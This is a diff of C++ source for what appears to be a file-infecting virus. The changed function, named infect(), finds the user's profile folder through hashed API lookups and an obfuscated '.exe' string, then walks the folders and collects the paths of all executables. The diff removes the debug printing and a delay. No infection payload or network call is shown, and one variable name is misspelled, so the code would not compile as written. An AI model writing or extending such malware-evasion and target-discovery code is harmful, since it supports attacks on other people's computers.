@@ -153,11 +153,8 @@ int infect(void)
    PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
    SHGetFolderPathAHeader getFolderPath = reinterpret_cast<SHGetFolderPathAHeader>(get_proc_by_hash(shell32Module, 0xe8692330));
    
-   std::size_t directory_count = 0;
-   char **directories = nullptr;
    char *profile_directory = reinterpret_cast<char *>(malloc(MAX_PATH+1));
 
-   /* get profile directory from SHGetFolderPathA */
    if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
       return 2;
 
@@ -172,6 +169,9 @@ int infect(void)
    char **search_stack = reinterpret_cast<char **>(malloc(sizeof(char *) * search_stack_size));
    search_stack[0] = search_root;
 
+   std::size_t found_executables_size = 0;
+   char **found_executables = nullptr;
+
    while (search_stack_size > 0)
    {
       char *search_visit = search_stack[0];
@@ -179,7 +179,6 @@ int infect(void)
       char exeSearch[] = {'.','e','x','e',0};
       --search_stack_size;
 
-      /* pop the search off the stack */
       if (search_stack_size == 0)
       {
          free(search_stack);
@@ -201,11 +200,8 @@ int infect(void)
       if (find_handle == INVALID_HANDLE_VALUE)
          goto free_and_continue;
 
-      std::wcout << "Enumerating " << search_string << std::endl;
-      
       do
       {
-         std::wcout << "\t" << find_data.cFileName << std::endl;
          if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
              (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
          {
@@ -229,22 +225,39 @@ int infect(void)
                search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
             
             search_stack[search_stack_size-1] = new_directory;
-            std::wcout << "\t\tIs a directory " << std::hex << find_data.dwFileAttributes << std::endl;
          }
          else if (strnicmp(find_data.cFileName+(strlen(find_data.cFileName)-4), exeSearch, strlen(exeSearch)) == 0)
          {
-            std::wcout << "\t\tIs an executable" << std::endl;
+            char *found_executable = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
+            memcpy(found_executable, search_visit, strlen(search_visit)+1);
+            strncat(found_executable, slash, strlen(slash));
+            strncat(found_executable, find_data.cFileName, strlen(find_data.cFileName));
+
+            ++found_executables_size;
+            
+            if (found_executables == nullptr)
+               found_executables = reinterpret_cast<char **>(malloc(sizeof(char *) * found_executables_size));
+            else
+               found_executables = reinterpret_cast<char **>(realloc(found_executables, sizeof(char *) * found_executables_size));
+
+            found_executables[found_executables_size-1] = found_executable;
          }
       } while (findNextFile(find_handle, &find_data));
-
-      std::wcout << std::endl;
 
    free_and_continue:
       free(search_string);
       free(search_visit);
-
-      Sleep(1000);
    }
+
+   std::wcout << found_executables_size << " executables were found." << std::endl;
+
+   for (std::size_t i=0; i<found_excutables_size; ++i)
+   {
+      std::wcout << "\t" << found_executables[i] << std::endl;
+      free(found_executables[i]);
+   }
+
+   free(found_executables);
 
    return 0;
 }
